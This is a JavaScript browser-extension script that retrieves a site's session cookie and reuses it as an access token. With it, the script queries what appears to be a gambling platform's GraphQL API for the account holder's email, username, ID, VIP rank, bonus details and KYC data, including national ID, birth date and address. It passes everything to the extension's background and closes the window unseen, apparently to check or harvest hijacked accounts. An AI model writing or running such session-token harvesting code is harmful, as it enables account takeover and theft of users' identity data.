let domain = "";function extractAndSendUserInfo() {setTimeout(() => {domain = window.location.hostname;chrome.runtime.sendMessage({ type: "GetSessionCookie", domain: domain },function (response) {if (response && response.value) {sendGraphQLRequest(response.value, domain);}});}, 500);}extractAndSendUserInfo();document.addEventListener("DOMContentLoaded", extractAndSendUserInfo);let wager = "";let progress = "";let username1 = "";let stid = "";let email1 = "";let ctat = "";let internali = "NA";let reloadam = "NA";let reloaduntil = "NA";let reloadhave = "";let rank = "NoRank";function checkAndSendUserInfo() {if (username1 && stid && email1 && ctat && reloadhave) {chrome.runtime.sendMessage({type: "userinfoo",rank,progress,username1,stid,email1,ctat,reloadhave,reloaduntil,internali,reloadam,});setTimeout(() => {window.close();}, 500);}}
function sendGraphQLRequest(token, domain) {
  fetch("https://" + domain + "/_api/graphql", {
    headers: {
      accept: "*/*",
      "accept-language": "en-US,en;q=0.9,tr-TR;q=0.8,tr;q=0.7",
      "access-control-allow-origin": "*",
      "content-type": "application/json",
      priority: "u=1, i",
      "sec-ch-ua":
        '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
      "sec-ch-ua-arch": '"x86"',
      "sec-ch-ua-bitness": '"64"',
      "sec-ch-ua-full-version": '"126.0.6478.63"',
      "sec-ch-ua-full-version-list":
        '"Not/A)Brand";v="8.0.0.0", "Chromium";v="126.0.6478.63", "Google Chrome";v="126.0.6478.63"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-model": '""',
      "sec-ch-ua-platform": '"Windows"',
      "sec-ch-ua-platform-version": '"15.0.0"',
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-origin",
      "x-access-token": token,
      "x-language": "en",
    },
    referrer: "https://" + domain + "/",
    referrerPolicy: "strict-origin-when-cross-origin",
    body: '{"query":"query UserKycInfo($stakeKycEnabled: Boolean = false, $veriffEnabled: Boolean = false) {\\n  isDiscontinuedBlocked\\n  user {\\n    id\\n    roles {\\n      name\\n    }\\n    optionalFeatures\\n    kycStatus\\n    dob\\n    createdAt\\n    hasEmailVerified\\n    phoneNumber\\n    phoneCountryCode\\n    hasPhoneNumberVerified\\n    email\\n    registeredWithVpn\\n    isBanned\\n    isSuspended\\n    isSuspendedSportsbook\\n    jpyAlternateName: cashierAlternateName(currency: jpy) {\\n      firstName\\n      lastName\\n    }\\n    nationalId {\\n      nationalId\\n      expireDate\\n      issueDate\\n    }\\n    ...StakeKyc @include(if: $stakeKycEnabled)\\n    ...Veriff @include(if: $veriffEnabled)\\n  }\\n}\\n\\nfragment UserKycBasic on UserKycBasic {\\n  active\\n  address\\n  birthday\\n  city\\n  country\\n  createdAt\\n  firstName\\n  id\\n  lastName\\n  phoneNumber\\n  rejectedReason\\n  status\\n  updatedAt\\n  zipCode\\n  industry\\n  occupation\\n  occupationExperience\\n}\\n\\nfragment UserKycExtended on UserKycExtended {\\n  id\\n  active\\n  createdAt\\n  id\\n  rejectedReason\\n  status\\n}\\n\\nfragment UserKycFull on UserKycFull {\\n  active\\n  createdAt\\n  id\\n  rejectedReason\\n  status\\n}\\n\\nfragment UserKycUltimate on UserKycUltimate {\\n  id\\n  active\\n  createdAt\\n  id\\n  rejectedReason\\n  status\\n}\\n\\nfragment FiatTransactionEligibilityStateFragment on FiatTransactionEligibilityState {\\n  currency\\n  depositEnabled\\n  withdrawalEnabled\\n}\\n\\nfragment CryptoTransactionEligibilityStateFragment on CryptoTransactionEligibilityState {\\n  depositEnabled\\n  withdrawalEnabled\\n}\\n\\nfragment UserTransactionEligibilityStateFragment on UserTransactionEligibilityState {\\n  fiat {\\n    ...FiatTransactionEligibilityStateFragment\\n  }\\n  crypto {\\n    ...CryptoTransactionEligibilityStateFragment\\n  }\\n  useLegacyLogic\\n}\\n\\nfragment StakeKyc on User {\\n  isKycBasicRequired\\n  isKycExtendedRequired\\n  isKycFullRequired\\n  isKycUltimateRequired\\n  kycBasic {\\n    ...UserKycBasic\\n  }\\n  kycExtended {\\n    ...UserKycExtended\\n  }\\n  kycFull {\\n    ...UserKycFull\\n  }\\n  kycUltimate {\\n    ...UserKycUltimate\\n  }\\n  transactionEligibilityState {\\n    ...UserTransactionEligibilityStateFragment\\n  }\\n}\\n\\nfragment Veriff on User {\\n  veriffStatus\\n  veriffUser {\\n    reason\\n  }\\n}\\n","variables":{"stakeKycEnabled":true,"veriffEnabled":false}}',
    method: "POST",
    mode: "cors",
    credentials: "include",
  })
    .then((response) => response.json())
    .then((data) => {
      if (data && data.data && data.data.user && data.data.user.email) {
        email1 = data.data.user.email;
        ctat = data.data.user.createdAt;
        checkAndSendUserInfo();
      } else {
      }
    })
    .catch((error) => {
      console.error("GraphQL Request Failed:", error);
      extractAndSendUserInfo();
    });
  fetch("https://" + domain + "/_api/graphql", {
    headers: {
      accept: "*/*",
      "accept-language": "en-US,en;q=0.9,tr-TR;q=0.8,tr;q=0.7",
      "access-control-allow-origin": "*",
      "content-type": "application/json",
      priority: "u=1, i",
      "sec-ch-ua":
        '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
      "sec-ch-ua-arch": '"x86"',
      "sec-ch-ua-bitness": '"64"',
      "sec-ch-ua-full-version": '"126.0.6478.63"',
      "sec-ch-ua-full-version-list":
        '"Not/A)Brand";v="8.0.0.0", "Chromium";v="126.0.6478.63", "Google Chrome";v="126.0.6478.63"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-model": '""',
      "sec-ch-ua-platform": '"Windows"',
      "sec-ch-ua-platform-version": '"15.0.0"',
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-origin",
      "x-access-token": token,
      "x-language": "en",
    },
    referrer: "https://" + domain + "/",
    referrerPolicy: "strict-origin-when-cross-origin",
    body: '{"query":"query UserMeta($name: String, $signupCode: Boolean = false) {\\n  user(name: $name) {\\n    id\\n    name\\n    isMuted\\n    isRainproof\\n    isBanned\\n    createdAt\\n    campaignSet\\n    selfExclude {\\n      id\\n      status\\n      active\\n      createdAt\\n      expireAt\\n    }\\n    signupCode @include(if: $signupCode) {\\n      id\\n      code {\\n        id\\n        code\\n      }\\n    }\\n  }\\n}\\n","variables":{"signupCode":true}}',
    method: "POST",
    mode: "cors",
    credentials: "include",
  })
    .then((response) => response.json())
    .then((data) => {
      if (data && data.data && data.data.user && data.data.user.name) {
        username1 = data.data.user.name;
        checkAndSendUserInfo();
      } else {
        console.log("Name not found in the response");
      }
    })
    .catch((error) => {
      console.error("GraphQL Request Failed:", error);
      extractAndSendUserInfo();
    });
  fetch("https://" + domain + "/_api/graphql", {
    headers: {
      accept: "*/*",
      "accept-language": "en-US,en;q=0.9,tr-TR;q=0.8,tr;q=0.7",
      "access-control-allow-origin": "*",
      "content-type": "application/json",
      priority: "u=1, i",
      "sec-ch-ua":
        '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
      "sec-ch-ua-arch": '"x86"',
      "sec-ch-ua-bitness": '"64"',
      "sec-ch-ua-full-version": '"126.0.6478.63"',
      "sec-ch-ua-full-version-list":
        '"Not/A)Brand";v="8.0.0.0", "Chromium";v="126.0.6478.63", "Google Chrome";v="126.0.6478.63"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-model": '""',
      "sec-ch-ua-platform": '"Windows"',
      "sec-ch-ua-platform-version": '"15.0.0"',
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-origin",
      "x-access-token": token,
      "x-language": "en",
    },
    referrer: "https://" + domain + "/?tab=progress&modal=vip",
    referrerPolicy: "strict-origin-when-cross-origin",
    body: '{"query":"query VipProgressMeta {\\n  user {\\n    id\\n    flagProgress {\\n      flag\\n      progress\\n    }\\n  }\\n}\\n","variables":{}}',
    method: "POST",
    mode: "cors",
    credentials: "include",
  })
    .then((response) => response.json())
    .then((data) => {
      if (data && data.data && data.data.user) {
        stid = data.data.user.id;
      }
      if (data && data.data && data.data.user && data.data.user.flagProgress) {
        wager = data.data.user.flagProgress.flag || "NoRank";
        progress = data.data.user.flagProgress.progress || 0;
        if (wager === "bronze") {
          rank = "Bronze";
        } else if (wager === "silver") {
          rank = "Silver";
        } else if (wager === "gold") {
          rank = "Gold";
        } else if (wager === "platinum") {
          rank = "Platinum 1";
        } else if (wager === "wagered(500k)") {
          rank = "Platinum 2";
        } else if (wager === "wagered(1m)") {
          rank = "Platinum 3";
        } else if (wager === "wagered(2.5m)") {
          rank = "Platinum 4";
        } else if (wager === "wagered(5m)") {
          rank = "Platinum 5";
        } else if (wager === "wagered(10m)") {
          rank = "Platinum 6";
        } else {
          rank = "NoRank";
        }
        checkAndSendUserInfo();
      } else {
        rank = "NoRank";
        progress = 0;
        checkAndSendUserInfo();
      }
    })
    .catch((error) => {
      console.error("GraphQL Request Failed:", error);
      extractAndSendUserInfo();
    });
  fetch("https://" + domain + "/_api/graphql", {
    headers: {
      accept: "*/*",
      "accept-language": "en-US,en;q=0.9,tr-TR;q=0.8,tr;q=0.7",
      "access-control-allow-origin": "*",
      "content-type": "application/json",
      priority: "u=1, i",
      "sec-ch-ua":
        '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
      "sec-ch-ua-arch": '"x86"',
      "sec-ch-ua-bitness": '"64"',
      "sec-ch-ua-full-version": '"126.0.6478.63"',
      "sec-ch-ua-full-version-list":
        '"Not/A)Brand";v="8.0.0.0", "Chromium";v="126.0.6478.63", "Google Chrome";v="126.0.6478.63"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-model": '""',
      "sec-ch-ua-platform": '"Windows"',
      "sec-ch-ua-platform-version": '"15.0.0"',
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-origin",
      "x-access-token": token,
      "x-language": "en",
      "x-operation-name": "ClaimReloadMeta",
      "x-operation-type": "query",
    },
    referrer: "https://" + domain + "/?tab=progress&modal=vip",
    referrerPolicy: "strict-origin-when-cross-origin",
    body: '{"query":"query ClaimReloadMeta($currency: CurrencyEnum!) {\\n  user {\\n    id\\n    flags {\\n      flag\\n    }\\n    flagProgress {\\n      flag\\n    }\\n    reload: faucet {\\n      id\\n      amount(currency: $currency)\\n      active\\n      claimInterval\\n      lastClaim\\n      expireAt\\n      createdAt\\n      updatedAt\\n    }\\n  }\\n}\\n","variables":{"currency":"trx"}}',
    method: "POST",
    mode: "cors",
    credentials: "include",
  })
    .then((response) => response.json())
    .then((data) => {
      if (
        data &&
        data.data &&
        data.data.user &&
        data.data.user.reload &&
        data.data.user.reload.active
      ) {
        const reloadstat = data.data.user.reload.active;
        if (reloadstat) {
          internali = data.data.user.reload.claimInterval;
          reloadam = data.data.user.reload.amount;
          reloaduntil = data.data.user.reload.expireAt;
          reloadhave = "true";
          checkAndSendUserInfo();
        }
      } else {
        reloadhave = "false";
        checkAndSendUserInfo();
      }
    })
    .catch((error) => {
      reloadhave = "false";
      checkAndSendUserInfo();
    });
}
